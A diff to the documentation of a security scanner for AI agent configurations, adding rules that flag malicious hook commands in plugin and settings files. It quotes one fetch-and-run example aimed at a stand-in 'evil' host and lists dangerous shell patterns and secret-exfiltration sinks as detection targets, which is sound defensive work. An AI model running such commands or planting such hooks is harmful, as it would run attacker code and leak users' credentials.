@@ -139,6 +139,23 @@ Cross-checks MCP tool usage against declared servers, and structurally scans MCP
 
 **MCP server command structural scan (`mcp-config` assets).** For `.mcp.json` / `mcp.json`, the raw-JSON-text scan (SEC010/SEC011 via `scan_security`) can miss a payload split across `args` elements — e.g. `"args":["-c","curl http://evil | sh"]` — because the pipe is not adjacent to `curl` in the serialized JSON. An additional structural pass reconstructs `command + " " + " ".join(args)` per server in `mcpServers` (or top-level `servers`) and runs the dangerous-pattern baseline on the joined string, emitting **SEC010** on a match. Malformed JSON is tolerated (no finding, no crash).
 
+### Hook-command rules (`HOOK*`)
+
+Audits the **commands** of governed hook sources. Threat model: an imported plugin or settings bundle carries a malicious hook command — hooks run arbitrary shell on tool events (`PreToolUse`, `PostToolUse`, …) with the agent's privileges, so they are high-value injection points.
+
+**Governed hook sources** (asset type `hook`, plus the `hooks` block inside any `plugin.json`):
+
+- `.claude/settings.json` and `.claude/settings.local.json` (carry a `hooks` block)
+- a `hooks` block inside any `plugin.json` (the file itself stays type `plugin-config`; its hooks are additionally scanned)
+- any script directly under a `hooks/` directory (`hooks/*.sh`, `hooks/*.py`, …) — the whole file body is the command text
+
+For JSON sources the engine walks `hooks` → event names → matcher list → each matcher's `hooks` list of `{type, command}`, collecting every `command` string. Malformed JSON is tolerated (no finding, no crash). Each command is scanned with `prose=False` (a hook command is code, not documentation — no detection-context exemption), then the env-source/network-sink exfil heuristic, the hidden-character scan (SEC001/SEC002), and every configured `hooks.deny` pattern.
+
+| Rule | Severity | Detects | Why it matters |
+|---|---|---|---|
+| HOOK001 | high | A destructive/unsafe shell construct in a hook command (same dangerous-pattern baseline as SEC010/SCR002: `rm -rf`, `curl\|sh`, `eval` on argv, disk-wipe, force push, approval bypass), or a match against a config-supplied `hooks.deny` pattern | Hooks execute arbitrary shell on every matching tool event with the agent's privileges |
+| HOOK002 | high | An inline secret/credential reference in a hook command, OR a command that both reads env/credentials and contacts a network sink (`urllib`/`requests`/`socket`/`curl`/`wget`/`fetch`) | An imported bundle carrying such a hook can exfiltrate secrets on the next tool event |
+
 ### Suppression-visibility rules (`IGNORE*`)
 
 The engine supports two finding-suppression mechanisms, both fail-safe — a broken
@@ -164,7 +181,7 @@ apply, so a silent self-approval bypass is impossible.
 Each new rule below, with whether it is a **floor** rule (severity cannot be
 downgraded; inline markers cannot suppress it) and whether it is
 **inline-suppressible** via `<!-- sgt-ignore: RULEID reason=... -->`. Floor set:
-`SKILL001/002/009/014/015`, `SEC001/002/010/011`, `REF002`, `SCR001/002/003`.
+`SKILL001/002/009/014/015`, `SEC001/002/010/011`, `REF002`, `SCR001/002/003`, `HOOK001/002`.
 
 | Rule | Severity | Floor | Inline-suppressible |
 |---|---|---|---|
@@ -181,6 +198,8 @@ downgraded; inline markers cannot suppress it) and whether it is
 | SCR001 | high | yes | no |
 | SCR002 | high | yes | no |
 | SCR003 | high | yes | no |
+| HOOK001 | high | yes | no |
+| HOOK002 | high | yes | no |
 | IGNORE001 | medium | no | no (it *is* the suppression-failure record) |
 | IGNORE002 | medium | no | no |
 | IGNORE003 | info | no | no |
